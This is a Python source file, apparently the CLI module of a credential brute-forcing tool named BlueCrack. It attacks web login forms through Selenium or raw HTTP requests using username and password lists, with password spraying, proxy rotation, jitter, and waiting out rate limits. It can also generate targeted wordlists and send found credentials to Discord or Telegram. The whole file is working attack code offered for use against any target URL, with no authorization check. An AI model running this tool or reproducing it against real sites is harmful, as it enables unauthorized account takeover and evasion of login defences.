"""
BlueCrack CLI Attack Module
============================
Brute-force attack controller for CLI and Interactive Wizard modes.

Supports two attack modes:
  - **browser** (default): Selenium-based, uses a real Chrome browser
  - **http**: Raw HTTP POST requests (Hydra-style), orders of magnitude faster
"""

import argparse
import os
import random
import signal
import sys
import threading
import time
from queue import Queue
from typing import Any, Dict, List, Optional, Set, Tuple

from .constants import (
    _BLUE,
    _BOLD,
    _CYAN,
    _GREEN,
    _RED,
    _RESET,
    _YELLOW,
    AUTO_DETECT_JS,
    CLICK_LISTENER_JS,
    CSS_PATH_JS,
    HAS_KEYBOARD,
)
from .utils import (
    build_chrome_options,
    create_driver_safe,
    save_json_report,
)

if HAS_KEYBOARD:
    try:
        import keyboard
    except ImportError:
        pass


def run_attack_cli(args: argparse.Namespace) -> None:
    """Run CLI credential auditing engine."""
    _GLOBAL_STOP: threading.Event = threading.Event()
    _FOUND_EVENT: threading.Event = threading.Event()

    from .notifier import Notifier
    notifier = Notifier()
    if getattr(args, "discord_webhook", None):
        notifier.add_discord(args.discord_webhook)
    if getattr(args, "telegram_token", None) and getattr(args, "telegram_chat_id", None):
        notifier.add_telegram(args.telegram_token, args.telegram_chat_id)

    def _signal_handler(sig: int, frame: Any) -> None:
        """Handle Ctrl+C / Ctrl+X for graceful shutdown."""
        print(f"\n{_YELLOW}[!] Caught Ctrl+C / Ctrl+X — stopping gracefully...{_RESET}")
        _GLOBAL_STOP.set()
        _FOUND_EVENT.set()

    # Save original signal handler, register ours, restore on exit
    old_sig = signal.signal(signal.SIGINT, _signal_handler)

    try:
        # INTERACTIVE MODE
        auto_detect = False
        attack_mode = getattr(args, "mode", "browser")

        if args.interactive:
            print(f"\n{_CYAN}--- WIZARD MODE ---{_RESET}")

            # MODE SELECTION
            mode_input = (
                input(
                    f"\nAttack mode? [{_GREEN}http{_RESET}=raw HTTP (fast), "
                    f"{_CYAN}browser{_RESET}=Selenium (for JS sites)] "
                    f"[default: http]: "
                )
                .strip()
                .lower()
            )
            if mode_input in ("browser", "b"):
                attack_mode = "browser"
            else:
                attack_mode = "http"

            # CUPP Integration
            run_cupp = (
                input("\nGenerate a targeted wordlist first using CUPP? (y/n) [default: n]: ")
                .strip()
                .lower()
                == "y"
            )
            if run_cupp:
                print(
                    f"\n{_YELLOW}--- LAUNCHING CUPP (Common User Passwords Profiler) ---{_RESET}"
                )
                os.system(f"{sys.executable} -m bluecrack.vendor.cupp -i")
                print(
                    f"\n{_GREEN}[+] CUPP completed! Make sure to remember the saved filename.{_RESET}\n"
                )

            args.url = input("\nEnter Target URL: ").strip()
            args.username = (
                input("Enter single username to test (leave blank to skip): ").strip() or None
            )
            if not args.username:
                args.userfile = input("Enter path to usernames list file: ").strip() or None

            # Get password approach correctly in wizard
            single_pass = input("Enter single password to test (leave blank to skip): ").strip()
            if single_pass:
                args.password = single_pass
                args.passfile = None
            else:
                args.password = None
                args.passfile = input("Enter path to passwords list file: ").strip() or None

            threads_in_str = input("Enter number of threads [default: 1]: ").strip()
            args.threads = int(threads_in_str) if threads_in_str.isdigit() else 1

            err_in_str = input("Enter error string to check (default: empty): ").strip()
            if err_in_str:
                args.error = err_in_str

            succ_in_str = input("Enter success string to check (default: empty): ").strip()
            if succ_in_str:
                args.success = succ_in_str

            delay_in_str = input(
                "Enter general delay between attempts in seconds [default: 0]: "
            ).strip()
            args.delay = (
                float(delay_in_str) if delay_in_str.replace(".", "", 1).isdigit() else 0.0
            )

            jitter_in_str = input(
                "Enter jitter/randomizer up to X seconds [default: 0.0]: "
            ).strip()
            args.jitter = (
                float(jitter_in_str) if jitter_in_str.replace(".", "", 1).isdigit() else 0.0
            )

            use_proxy = input("Use proxy? (y/n) [default: n]: ").strip().lower() == "y"
            if use_proxy:
                p_file = input(
                    "Enter path to proxy list file (or hit enter to use single proxy): "
                ).strip()
                if p_file:
                    args.proxyfile = p_file
                else:
                    args.proxy = input(
                        "Enter proxy IP:PORT (e.g., http://1.2.3.4:8080): "
                    ).strip()

            rl_bypass = (
                input("Enable Auto-Throttle for Rate Limits? (y/n) [default: y]: ")
                .strip()
                .lower()
                != "n"
            )
            args.cooldown = 12 if rl_bypass else 0
            if rl_bypass:
                rl_text = input(
                    "Enter Rate Limit text to detect [default: 'too many requests']: "
                ).strip()
                if rl_text:
                    args.limit_text = rl_text

            max_att_str = input("Max attempts (0=unlimited) [default: 0]: ").strip()
            args.max_attempts = int(max_att_str) if max_att_str.isdigit() else 0

            cont_str = input(
                "Continue testing after finding credentials? (y/n) [default: n]: "
            ).strip().lower()
            args.continue_after_success = cont_str == "y"

            if attack_mode == "browser":
                auto_detect = (
                    input("Auto-detect CSS selectors instead of clicking? (y/n) [default: y]: ")
                    .strip()
                    .lower()
                    != "n"
                )
            elif attack_mode == "http":
                # HTTP-specific wizard questions
                form_action_in = input(
                    "Form action URL (leave blank to auto-detect): "
                ).strip()
                if form_action_in:
                    args.form_action = form_action_in
                ufield_in = input(
                    "Username field name (leave blank to auto-detect): "
                ).strip()
                if ufield_in:
                    args.username_field = ufield_in
                pfield_in = input(
                    "Password field name (leave blank to auto-detect): "
                ).strip()
                if pfield_in:
                    args.password_field = pfield_in
                csrf_in = input(
                    "CSRF token field name (leave blank to auto-detect): "
                ).strip()
                if csrf_in:
                    args.csrf_field = csrf_in
        else:
            auto_detect = False
            if not args.url:
                raise SystemExit(f"{_RED}[-] Provide --url or use -i wizard{_RESET}")

        if not args.username and not args.userfile:
            raise SystemExit(f"{_RED}[-] Provide -u USER or -U USERFILE{_RESET}")

        if not args.password and not args.passfile:
            raise SystemExit(f"{_RED}[-] Provide -p PASS or -P PASSLIST{_RESET}")

        # LOAD USERNAMES
        users: List[str] = []
        if args.username:
            users.append(args.username)
        if args.userfile:
            try:
                with open(args.userfile, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        if line.strip():
                            users.append(line.strip())
            except Exception as e:
                print(f"{_RED}[-] Failed to read username file '{args.userfile}': {e}{_RESET}")
                sys.exit(1)

        # LOAD PASSWORDS
        passwords: List[str] = []
        if args.password:
            passwords.append(args.password)
        if args.passfile:
            try:
                with open(args.passfile, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        px = line.strip()
                        if px:
                            passwords.append(px)
            except Exception as e:
                print(f"{_RED}[-] Failed to read password file '{args.passfile}': {e}{_RESET}")
                sys.exit(1)

        # LOAD PROXIES
        proxies: List[str] = []
        if getattr(args, "proxy", None):
            proxies.append(args.proxy)
        if getattr(args, "proxyfile", None):
            try:
                with open(args.proxyfile, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        if line.strip():
                            proxies.append(line.strip())
            except Exception as e:
                print(f"{_RED}[-] Failed to read proxy file '{args.proxyfile}': {e}{_RESET}")
                sys.exit(1)

        TARGET_URL: str = args.url
        if (
            TARGET_URL
            and not TARGET_URL.startswith("http://")
            and not TARGET_URL.startswith("https://")
        ):
            TARGET_URL = "http://" + TARGET_URL

        # ═══════════════════════════════════════════════════════════
        # HTTP MODE — Raw HTTP requests (Hydra-style)
        # ═══════════════════════════════════════════════════════════
        if attack_mode == "http":
            _run_http_attack(
                args, users, passwords, proxies, TARGET_URL,
                _GLOBAL_STOP, _FOUND_EVENT, notifier=notifier,
            )
            return

        # ═══════════════════════════════════════════════════════════
        # BROWSER MODE — Selenium WebDriver
        # ═══════════════════════════════════════════════════════════
        _run_browser_attack(
            args, users, passwords, proxies, TARGET_URL,
            auto_detect, _GLOBAL_STOP, _FOUND_EVENT, notifier=notifier,
        )

    finally:
        # Restore original signal handler
        signal.signal(signal.SIGINT, old_sig)


# ═══════════════════════════════════════════════════════════════════
# HTTP MODE IMPLEMENTATION
# ═══════════════════════════════════════════════════════════════════


def _run_http_attack(
    args: argparse.Namespace,
    users: List[str],
    passwords: List[str],
    proxies: List[str],
    target_url: str,
    global_stop: threading.Event,
    found_event: threading.Event,
    notifier: Any = None,
) -> None:
    from .session import SessionManager
    session_mgr = SessionManager() if not getattr(args, "no_session", False) else None
    if getattr(args, "resume", False) and session_mgr and session_mgr.has_session():
        state = session_mgr.load_state()
        if state:
            print(f"{_GREEN}[+] Resuming previous HTTP attack session saved at {state.get('saved_at_iso')}{_RESET}")
            remaining_combos = state.get("remaining_combos", [])
            users = [c[0] for c in remaining_combos]
            passwords = list(set(c[1] for c in remaining_combos))
    """Run the raw HTTP attack using HTTPAttackEngine."""
    from .http_engine import HTTPAttackEngine

    THREADS: int = args.threads if args.threads > 1 else 4  # Default higher for HTTP
    ERROR_MSG: Optional[str] = args.error.lower() if args.error else None
    SUCCESS_MSG: Optional[str] = args.success.lower() if args.success else None
    LIMIT_TEXT: Optional[str] = args.limit_text.lower() if args.limit_text else None
    MAX_ATTEMPTS: int = args.max_attempts
    CONTINUE_AFTER_SUCCESS: bool = args.continue_after_success
    JSON_REPORT: bool = args.json_report

    # Parse extra fields
    extra_fields: Dict[str, str] = {}
    extra_fields_raw = getattr(args, "extra_fields", "")
    if extra_fields_raw:
        for pair in extra_fields_raw.split(","):
            if "=" in pair:
                k, v = pair.split("=", 1)
                extra_fields[k.strip()] = v.strip()

    USERNAME_FIXED: Optional[str] = users[0] if len(users) == 1 else None
    WORDLIST: str = f"{len(passwords)} passwords loaded for {len(users)} users"
    PROXY_INFO: str = f"{len(proxies)} proxies loaded" if proxies else "No Proxies"

    print("\n==============================")
    print(f"   {_BOLD}⚡ HTTP BRUTE MODE (Hydra-style){_RESET}")
    print("==============================\n")
    print(f"Target URL: {target_url}")
    print(f"User: {USERNAME_FIXED or f'{len(users)} users'}")
    print(f"Wordlist: {WORDLIST}")
    print(f"Proxies: {PROXY_INFO}")
    print(f"Threads: {THREADS}")
    if MAX_ATTEMPTS > 0:
        print(f"Max Attempts: {MAX_ATTEMPTS}")
    if CONTINUE_AFTER_SUCCESS:
        print(f"{_CYAN}[*] Will continue after finding credentials{_RESET}")

    engine = HTTPAttackEngine()
    cli_start_time = time.time()

    # Set up CLI callbacks
    def log_cb(msg: str) -> None:
        print(msg)

    def progress_cb(current: int, total: int) -> None:
        pass  # Speed is printed via metrics

    def finished_cb(found: bool, message: str) -> None:
        if found:
            found_event.set()

    engine.set_callbacks(
        log_cb=log_cb,
        progress_cb=progress_cb,
        finished_cb=finished_cb,
    )

    ctx: Dict[str, Any] = {
        "target_url": target_url,
        "users": users,
        "passwords": passwords,
        "threads": THREADS,
        "error_msg": ERROR_MSG,
        "success_msg": SUCCESS_MSG,
        "limit_text": LIMIT_TEXT,
        "delay": args.delay,
        "jitter": args.jitter,
        "cooldown": args.cooldown,
        "max_attempts": MAX_ATTEMPTS,
        "continue_after_success": CONTINUE_AFTER_SUCCESS,
        "proxies": proxies,
        "form_action": getattr(args, "form_action", ""),
        "username_field": getattr(args, "username_field", ""),
        "password_field": getattr(args, "password_field", ""),
        "csrf_field": getattr(args, "csrf_field", ""),
        "extra_fields": extra_fields,
        "follow_redirects": getattr(args, "follow_redirects", False),
        "notifier": notifier,
        "spray_mode": getattr(args, "spray", False),
        "enable_session": not getattr(args, "no_session", False),
    }

    # Start attack (blocking — waits for thread internally)
    engine.start(ctx)

    # Wait for completion
    while engine.is_running and not global_stop.is_set():
        time.sleep(0.2)

    if global_stop.is_set():
        engine.stop()
        time.sleep(0.5)

    cli_end_time = time.time()
    metrics = engine.get_metrics()
    found_creds = engine.get_found_creds()

    if not found_creds:
        print(f"\n{_RED}[-] Finished testing. No valid credentials found.{_RESET}")
    else:
        print(f"\n{_GREEN}[+] Finished testing. Valid credentials found!{_RESET}")

    # Print summary
    print(f"\n{_CYAN}═══ Attack Summary (HTTP Mode) ═══{_RESET}")
    for k in ["attempted", "successes", "failures", "errors", "rate_limit_hits", "requeued"]:
        print(f"  {k}: {metrics.get(k, 0)}")
    elapsed = cli_end_time - cli_start_time
    print(f"  elapsed: {elapsed:.1f}s")
    if metrics.get("attempted", 0) > 0 and elapsed > 0:
        print(f"  speed: {_GREEN}{metrics['attempted'] / elapsed:.1f} attempts/s{_RESET}")

    # Save JSON report if requested
    if JSON_REPORT:
        save_json_report(
            "bluecrack_cli_report.json",
            target_url,
            metrics,
            found_creds,
            cli_start_time,
            cli_end_time,
        )
        print(f"{_GREEN}[+] JSON report saved to bluecrack_cli_report.json{_RESET}")


# ═══════════════════════════════════════════════════════════════════
# BROWSER MODE IMPLEMENTATION
# ═══════════════════════════════════════════════════════════════════


def _run_browser_attack(
    args: argparse.Namespace,
    users: List[str],
    passwords: List[str],
    proxies: List[str],
    target_url: str,
    auto_detect: bool,
    global_stop: threading.Event,
    found_event: threading.Event,
    notifier: Any = None,
) -> None:
    """Run the browser-based Selenium attack."""
    from selenium import webdriver
    from selenium.common.exceptions import (
        NoSuchElementException,
        WebDriverException,
    )
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys

    USERNAME_FIXED: Optional[str] = users[0] if len(users) == 1 else None
    WORDLIST: str = f"{len(passwords)} passwords loaded for {len(users)} users"
    PROXY_INFO: str = f"{len(proxies)} proxies loaded" if proxies else "No Proxies"

    THREADS: int = args.threads
    ERROR_MSG: Optional[str] = args.error.lower() if args.error else None
    SUCCESS_MSG: Optional[str] = args.success.lower() if args.success else None
    LIMIT_TEXT: Optional[str] = args.limit_text.lower() if args.limit_text else None
    COOLDOWN: int = args.cooldown
    DELAY: float = args.delay
    JITTER: float = args.jitter
    RUN_HEADLESS: bool = args.headless
    MAX_ATTEMPTS: int = args.max_attempts
    CONTINUE_AFTER_SUCCESS: bool = args.continue_after_success
    OUTPUT_FILE: str = args.output
    JSON_REPORT: bool = args.json_report

    # LAUNCH SELENIUM (setup browser)
    driver = webdriver.Chrome()
    driver.get(target_url)

    username_selector: Optional[str] = None
    password_selector: Optional[str] = None

    print("\n==============================")
    print("   BROWSER BRUTE TESTER")
    print("==============================\n")
    print(f"Target URL: {target_url}")
    print(f"User: {USERNAME_FIXED}")
    print(f"Wordlist: {WORDLIST}")
    print(f"Proxies: {PROXY_INFO}")
    print(f"Threads: {THREADS}")
    print(f"Delay/Jitter: {DELAY}s / {JITTER}s")
    if MAX_ATTEMPTS > 0:
        print(f"Max Attempts: {MAX_ATTEMPTS}")
    if CONTINUE_AFTER_SUCCESS:
        print(f"{_CYAN}[*] Will continue after finding credentials{_RESET}")

    # Inject JS to track last clicked element
    driver.execute_script(CLICK_LISTENER_JS)

    # GENERATE CSS SELECTOR FROM CLICKED ELEMENT
    def get_css_selector() -> Optional[str]:
        elem = driver.execute_script("return window._lastClicked")
        if elem is None:
            return None
        return driver.execute_script(CSS_PATH_JS, elem)

    if auto_detect:
        print(f"\n{_CYAN}[*] Auto-detecting login form fields...{_RESET}")
        time.sleep(2)
        try:
            driver.execute_script(AUTO_DETECT_JS)
            detected_selectors = driver.execute_script("return window._autoFindFields();")
            if detected_selectors and detected_selectors[0] and detected_selectors[1]:
                username_selector, password_selector = detected_selectors
                print(f"{_GREEN}[+] AUTO-DETECTED Username: {username_selector}{_RESET}")
                print(f"{_GREEN}[+] AUTO-DETECTED Password: {password_selector}{_RESET}")
            else:
                print(f"{_RED}[-] Auto-detect failed. Please lock manually.{_RESET}")
                auto_detect = False
        except Exception as e:
            print(
                f"{_RED}[-] Auto-detect script failed: {e}. Switching to manual mode.{_RESET}"
            )
            auto_detect = False

    # WAIT FOR USER TO LOCK FIELDS
    if not auto_detect:
        print(f"\n{_CYAN}[>] CLICK username field → press S{_RESET}")
        print(f"{_CYAN}[>] CLICK password field → press T{_RESET}")
        print(f"{_CYAN}[>] Press ENTER to start brute{_RESET}\n")

        if not HAS_KEYBOARD:
            raise SystemExit(
                f"{_RED}[-] keyboard library not available. "
                f"Auto-detect failed and manual override requires keyboard library.{_RESET}"
            )

        while username_selector is None or password_selector is None:
            if keyboard.is_pressed("s"):
                css = get_css_selector()
                if css:
                    username_selector = css
                    print(f"{_BLUE}[+] Username selector LOCKED: {css}{_RESET}")
                time.sleep(0.3)
            if keyboard.is_pressed("t"):
                css = get_css_selector()
                if css:
                    password_selector = css
                    print(f"{_BLUE}[+] Password selector LOCKED: {css}{_RESET}")
                time.sleep(0.3)

    print("\nSelectors locked! Press ENTER to launch brute...")

    # TEST THE SELECTORS IMMEDIATELY
    if not username_selector or not password_selector:
        print(f"{_RED}[-] Could not determine input selectors. Exiting...{_RESET}")
        try:
            driver.quit()
        except Exception:
            pass
        return

    try:
        driver.find_element(By.CSS_SELECTOR, username_selector)
        driver.find_element(By.CSS_SELECTOR, password_selector)
    except Exception as e:
        print(f"{_RED}[-] Failed to find locked selectors on page: {e}{_RESET}")
        try:
            driver.quit()
        except Exception:
            pass
        return

    if HAS_KEYBOARD:
        keyboard.wait("enter")
    else:
        time.sleep(1)

    # Close the initial setup driver
    try:
        driver.quit()
    except Exception:
        pass

    from .session import SessionManager
    session_mgr = SessionManager() if not getattr(args, "no_session", False) else None

    # LOAD WORDLIST INTO QUEUE
    q: Queue = Queue(maxsize=1000)
    total_combos: int = len(users) * len(passwords)

    # CLI metrics
    _cli_metrics: Dict[str, int] = {
        "attempted": 0,
        "successes": 0,
        "failures": 0,
        "errors": 0,
        "rate_limit_hits": 0,
        "skipped_empty": 0,
        "requeued": 0,
    }
    _cli_metrics_lock = threading.Lock()
    _cli_found_creds: List[Tuple[str, str]] = []
    _cli_found_creds_lock = threading.Lock()
    _cli_found_users: Set[str] = set()
    _cli_found_users_lock = threading.Lock()
    _cli_start_time: float = time.time()

    # Check for session resume
    resumed = False
    if getattr(args, "resume", False) and session_mgr and session_mgr.has_session():
        state = session_mgr.load_state()
        if state:
            print(f"{_GREEN}[+] Resuming previous Browser attack session saved at {state.get('saved_at_iso')}{_RESET}")
            remaining_combos = state.get("remaining_combos", [])
            resumed = True

            def populate_resume() -> None:
                for u, p in remaining_combos:
                    q.put((u, p))

            populate = populate_resume
            # Seed metrics
            with _cli_metrics_lock:
                for k, v in state.get("metrics", {}).items():
                    if k in _cli_metrics:
                        _cli_metrics[k] = v
            # Seed found creds
            with _cli_found_creds_lock:
                for u, p in state.get("found_creds", []):
                    _cli_found_creds.append((u, p))
            # Seed found users
            with _cli_found_users_lock:
                for u, p in state.get("found_creds", []):
                    _cli_found_users.add(u)

    if not resumed:
        spray_mode = getattr(args, "spray", False)
        def populate_normal() -> None:
            if spray_mode:
                for pwd in passwords:
                    for user in users:
                        q.put((user, pwd))
            else:
                for user in users:
                    for pwd in passwords:
                        q.put((user, pwd))
        populate = populate_normal

    threading.Thread(target=populate, daemon=True).start()

    # WORKER FUNCTION
    def worker() -> None:
        ctx: Dict[str, Any] = {
            "headless": RUN_HEADLESS,
            "proxies": proxies,
            "use_tor": False,
        }
        options = build_chrome_options(ctx)
        thread_driver = create_driver_safe(options)
        if thread_driver is None:
            print(f"{_RED}[-] Thread startup error: could not create WebDriver{_RESET}")
            return

        try:
            while not q.empty() and not found_event.is_set() and not global_stop.is_set():
                # Check max attempts
                if MAX_ATTEMPTS > 0:
                    with _cli_metrics_lock:
                        if _cli_metrics["attempted"] >= MAX_ATTEMPTS:
                            break

                # Check if we should stop (non-continue mode)
                if not CONTINUE_AFTER_SUCCESS and found_event.is_set():
                    break

                try:
                    user, pwd = q.get(timeout=1)
                except Exception:
                    break

                # Skip empty passwords
                if not pwd or str(pwd).strip() == "":
                    with _cli_metrics_lock:
                        _cli_metrics["skipped_empty"] += 1
                    q.task_done()
                    continue

                # Skip already solved users (unless continue mode)
                if not CONTINUE_AFTER_SUCCESS:
                    with _cli_found_users_lock:
                        if user in _cli_found_users:
                            q.task_done()
                            continue

                try:
                    if found_event.is_set() and not CONTINUE_AFTER_SUCCESS:
                        break
                    if global_stop.is_set():
                        break

                    # Add delay if configured
                    actual_delay: float = DELAY
                    if JITTER > 0.0:
                        actual_delay += random.uniform(0, JITTER)

                    if actual_delay > 0.0:
                        for _ in range(int(actual_delay * 10)):
                            if found_event.is_set() and not CONTINUE_AFTER_SUCCESS:
                                break
                            time.sleep(0.1)

                    if (found_event.is_set() and not CONTINUE_AFTER_SUCCESS) or global_stop.is_set():
                        break

                    thread_driver.get(target_url)
                    if (found_event.is_set() and not CONTINUE_AFTER_SUCCESS) or global_stop.is_set():
                        break

                    try:
                        u = thread_driver.find_element(By.CSS_SELECTOR, username_selector)
                        p = thread_driver.find_element(By.CSS_SELECTOR, password_selector)
                        u.clear()
                        u.send_keys(user)
                        p.clear()
                        p.send_keys(pwd)
                        p.send_keys(Keys.ENTER)

                        with _cli_metrics_lock:
                            _cli_metrics["attempted"] += 1
                            attempt_num = _cli_metrics["attempted"]

                        if (found_event.is_set() and not CONTINUE_AFTER_SUCCESS) or global_stop.is_set():
                            break

                        print(
                            f"[{attempt_num}/{total_combos}] {_CYAN}[*]{_RESET} Trying: {user} / {pwd}"
                        )

                        # Wait for login to process
                        for _ in range(20):
                            if found_event.is_set() and not CONTINUE_AFTER_SUCCESS:
                                break
                            time.sleep(0.1)

                        if (found_event.is_set() and not CONTINUE_AFTER_SUCCESS) or global_stop.is_set():
                            break

                        # Check page
                        page_source: str = thread_driver.page_source.lower()
                        current_url: str = thread_driver.current_url

                        # Check for rate limiting first
                        if LIMIT_TEXT and LIMIT_TEXT in page_source:
                            print(
                                f"[{attempt_num}/{total_combos}] "
                                f"{_YELLOW}[!] Rate Limit detected ('{LIMIT_TEXT}')!{_RESET}"
                            )
                            with _cli_metrics_lock:
                                _cli_metrics["rate_limit_hits"] += 1
                            if COOLDOWN > 0:
                                print(
                                    f"{_CYAN}[~] Bypassing... Sleeping {COOLDOWN} seconds "
                                    f"before retrying {user}/{pwd}{_RESET}"
                                )
                                for _ in range(COOLDOWN * 10):
                                    if found_event.is_set() and not CONTINUE_AFTER_SUCCESS:
                                        break
                                    time.sleep(0.1)
                                if not found_event.is_set() or CONTINUE_AFTER_SUCCESS:
                                    q.put((user, pwd))
                                    with _cli_metrics_lock:
                                        _cli_metrics["requeued"] += 1
                            else:
                                print(
                                    f"{_RED}[-] Rate limit hit, skipping {user}/{pwd}...{_RESET}"
                                )
                            q.task_done()
                            continue

                        # Check explicit error
                        if ERROR_MSG and ERROR_MSG in page_source:
                            with _cli_metrics_lock:
                                _cli_metrics["failures"] += 1
                            q.task_done()
                            continue

                        # Determine success
                        is_success = False
                        if SUCCESS_MSG:
                            if SUCCESS_MSG in page_source:
                                is_success = True
                            else:
                                with _cli_metrics_lock:
                                    _cli_metrics["failures"] += 1
                                q.task_done()
                                continue
                        elif current_url != target_url and "login" not in current_url.lower():
                            is_success = True

                        if is_success:
                            print(
                                f"\n{_GREEN}{_BOLD}[+] VALID CREDENTIALS FOUND: {user} / {pwd}{_RESET}\n"
                            )
                            if notifier and notifier.has_backends:
                                notifier.notify("credential_found", {
                                    "username": user,
                                    "password": pwd,
                                    "target_url": target_url
                                })
                            with _cli_metrics_lock:
                                _cli_metrics["successes"] += 1
                            with _cli_found_creds_lock:
                                _cli_found_creds.append((user, pwd))
                            with _cli_found_users_lock:
                                _cli_found_users.add(user)

                            try:
                                with open(OUTPUT_FILE, "a", encoding="utf-8") as cf:
                                    cf.write(f"{user}:{pwd}\n")
                            except Exception as e:
                                print(f"{_RED}[-] Could not save credential: {e}{_RESET}")

                            # Save session state
                            if session_mgr:
                                remaining = []
                                try:
                                    with q.mutex:
                                        remaining = list(q.queue)
                                except Exception:
                                    pass
                                dummy_ctx = {
                                    "target_url": target_url,
                                    "error_msg": ERROR_MSG,
                                    "success_msg": SUCCESS_MSG,
                                    "threads": THREADS,
                                    "delay": DELAY,
                                    "jitter": JITTER,
                                    "headless": RUN_HEADLESS,
                                    "cooldown": COOLDOWN,
                                }
                                session_mgr.save_state(
                                    dummy_ctx, remaining, dict(_cli_metrics),
                                    list(_cli_found_creds)
                                )

                            if not CONTINUE_AFTER_SUCCESS:
                                found_event.set()
                                try:
                                    while not q.empty():
                                        q.get_nowait()
                                        q.task_done()
                                except Exception:
                                    pass
                                q.task_done()
                                break

                            # Clear browser state for reuse (no restart needed)
                            try:
                                thread_driver.delete_all_cookies()
                            except Exception:
                                pass
                        else:
                            with _cli_metrics_lock:
                                _cli_metrics["failures"] += 1

                            # Save session state periodically
                            if session_mgr and attempt_num % session_mgr.auto_save_interval == 0:
                                remaining = []
                                try:
                                    with q.mutex:
                                        remaining = list(q.queue)
                                except Exception:
                                    pass
                                dummy_ctx = {
                                    "target_url": target_url,
                                    "error_msg": ERROR_MSG,
                                    "success_msg": SUCCESS_MSG,
                                    "threads": THREADS,
                                    "delay": DELAY,
                                    "jitter": JITTER,
                                    "headless": RUN_HEADLESS,
                                    "cooldown": COOLDOWN,
                                }
                                session_mgr.save_state(
                                    dummy_ctx, remaining, dict(_cli_metrics),
                                    list(_cli_found_creds)
                                )

                    except (NoSuchElementException, WebDriverException):
                        with _cli_metrics_lock:
                            _cli_metrics["errors"] += 1
                        print(
                            f"{_RED}[-] Error during attempt with '{user} / {pwd}': "
                            f"element not found or page load issue.{_RESET}"
                        )
                except Exception as e:
                    with _cli_metrics_lock:
                        _cli_metrics["errors"] += 1
                    print(f"{_RED}[-] Navigation or unexpected error: {e}{_RESET}")
                finally:
                    q.task_done()
        finally:
            try:
                thread_driver.quit()
            except Exception:
                pass

    # THREAD LAUNCHER
    threads_list: List[threading.Thread] = []
    print(f"\n[*] Starting {THREADS} threads...\n")
    try:
        for _ in range(THREADS):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads_list.append(t)

        # Wait for completion
        while not q.empty() and not found_event.is_set() and not global_stop.is_set():
            time.sleep(0.1)

        if not found_event.is_set() and not global_stop.is_set():
            q.join()

        cli_end_time = time.time()

        if not found_event.is_set():
            print(f"\n{_RED}[-] Finished testing. No valid credentials found.{_RESET}")
        else:
            print(f"\n{_GREEN}[+] Finished testing. Valid credentials found!{_RESET}")

        # Print summary
        print(f"\n{_CYAN}═══ Attack Summary (Browser Mode) ═══{_RESET}")
        for k, v in _cli_metrics.items():
            print(f"  {k}: {v}")
        elapsed = cli_end_time - _cli_start_time
        print(f"  elapsed: {elapsed:.1f}s")
        if _cli_metrics["attempted"] > 0 and elapsed > 0:
            print(f"  speed: {_cli_metrics['attempted'] / elapsed:.1f} attempts/s")

        # Save JSON report if requested
        if JSON_REPORT:
            save_json_report(
                "bluecrack_cli_report.json",
                target_url,
                _cli_metrics,
                _cli_found_creds,
                _cli_start_time,
                cli_end_time,
            )
            print(f"{_GREEN}[+] JSON report saved to bluecrack_cli_report.json{_RESET}")

    except KeyboardInterrupt:
        print(f"\n{_YELLOW}[!] Interrupted by user (Ctrl+C). Exiting gracefully...{_RESET}")
        found_event.set()
        global_stop.set()
    finally:
        if session_mgr:
            session_mgr.clear_session()
        if global_stop.is_set() and not found_event.is_set():
            print(f"\n{_YELLOW}[!] Stopped by signal. Cleaning up...{_RESET}")
